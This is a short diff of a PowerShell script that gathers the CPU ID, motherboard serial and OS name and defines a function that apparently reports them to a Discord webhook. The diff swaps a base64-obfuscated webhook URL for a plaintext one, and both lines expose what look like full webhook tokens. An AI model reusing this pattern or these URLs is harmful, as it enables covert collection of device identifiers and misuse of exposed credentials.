@@ -5,8 +5,7 @@ $separador = "--------------------------------"
 $CPU = (Get-WmiObject -Class Win32_Processor | Select-Object -ExpandProperty ProcessorId)
 $MOT = (Get-WmiObject -Class Win32_BaseBoard | Select-Object -ExpandProperty SerialNumber)
 $OS = (Get-CimInstance -ClassName Win32_OperatingSystem).Caption
-$HOOK = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM0NTk0MjU2MzE1NjM5Mzk5NC9CRGtybnVsLXhjQWxnUmpIalJPV1RmQjE3WlM3SFNLdnRYZWFGV0VTTy1OSlFmYzRKQWZqUGItS08yWlhSUVdJTTluWA=="))
-
+$HOOK = "https://discord.com/api/webhooks/1357104883014041631/EcNr9xXcGA8tMSM4oPb9vbXAq-8t8qP_3bT3jDO_w1_G1Qo92BsT85iey-KsbOgdYcus"
 function reportar {
     param (
         [string]$mensaje
